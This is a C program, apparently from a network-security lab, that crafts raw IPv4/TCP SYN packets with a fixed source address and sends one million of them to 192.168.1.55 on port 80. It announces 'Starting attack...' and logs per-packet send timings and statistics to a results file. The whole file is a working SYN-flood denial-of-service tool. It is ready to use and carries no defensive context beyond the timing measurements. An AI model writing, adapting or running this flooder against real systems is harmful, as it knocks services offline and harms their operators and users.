#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <unistd.h>
#include <time.h>
#include <math.h>

#define PCKT_LEN 8192

unsigned short csum(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;

    sum = 0;
    while (nbytes > 1) {
        sum += *ptr++;
        nbytes -= 2;
    }
    if (nbytes == 1) {
        oddbyte = 0;
        *((unsigned char *) &oddbyte) = *(unsigned char *) ptr;
        sum += oddbyte;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    answer = (short) ~sum;
    return answer;
}

int main() {
    int sock;
    struct sockaddr_in sin;
    char packet[PCKT_LEN];
    struct iphdr *iph = (struct iphdr *) packet;
    struct tcphdr *tcph = (struct tcphdr *) (packet + sizeof(struct iphdr));
    struct timespec start, end;
    double *send_times;
    FILE *fp;
    double total_time = 0.0, average_time, std_dev = 0.0;
    int packets = 10000 * 100;
    int i;

    send_times = (double *)malloc(sizeof(double) * packets);
    if (send_times == NULL) {
        perror("Malloc failed");
        return 1;
    }

    sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
    if (sock < 0) {
        perror("Socket error");
        return 1;
    }

    sin.sin_family = AF_INET;
    sin.sin_port = htons(80);
    sin.sin_addr.s_addr = inet_addr("192.168.1.55"); 

    int one = 1;
    const int *val = &one;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0) {
        perror("Error setting IP_HDRINCL");
        return 1;
    }

    memset(packet, 0, PCKT_LEN);

  
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htons(54321);
    iph->frag_off = 0;
    iph->ttl = 255;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.1.2"); 
    iph->daddr = sin.sin_addr.s_addr;

    tcph->source = htons(1234);
    tcph->dest = htons(80);
    tcph->seq = 0;
    tcph->ack_seq = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htons(5840);
    tcph->check = 0;
    tcph->urg_ptr = 0;

    iph->check = csum((unsigned short *) packet, iph->tot_len >> 1);

    printf("Starting attack...\n");

    clock_gettime(CLOCK_MONOTONIC, &start);

    for (i = 0; i < packets; i++) {
        struct timespec s_time, e_time;
        clock_gettime(CLOCK_MONOTONIC, &s_time);

        if (sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin)) < 0) {
            perror("sendto failed");
        }

        clock_gettime(CLOCK_MONOTONIC, &e_time);
        double time_taken = (e_time.tv_sec - s_time.tv_sec) + (e_time.tv_nsec - s_time.tv_nsec) / 1e9;
        send_times[i] = time_taken;
        total_time += time_taken;

        if (i % 10000 == 0 && i != 0) {
            printf("Sent %d packets\n", i);
        }
    }

    clock_gettime(CLOCK_MONOTONIC, &end);
    average_time = total_time / packets;

    for (i = 0; i < packets; i++) {
        std_dev += pow(send_times[i] - average_time, 2);
    }
    std_dev = sqrt(std_dev / packets);

    fp = fopen("syns_results_c1.txt", "w");
    if (fp == NULL) {
        perror("File open failed");
        return 1;
    }

    for (i = 0; i < packets; i++) {
        fprintf(fp, "Packet %d: %.6f ms\n", i + 1, send_times[i] * 1000);
    }

    double total_elapsed = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
    fprintf(fp, "\nTotal time: %.2f seconds\n", total_elapsed);
    fprintf(fp, "Average time: %.6f ms\n", average_time * 1000);
    fprintf(fp, "Standard Deviation: %.6f ms\n", std_dev * 1000);

    fclose(fp);
    close(sock);
    free(send_times);

    printf("\n Attack completed successfully!\n");
    printf("Total time: %.2f seconds\n", total_elapsed);
    printf("Average send time: %.6f ms\n", average_time * 1000);
    printf("Standard Deviation: %.6f ms\n", std_dev * 1000);

    return 0;
}

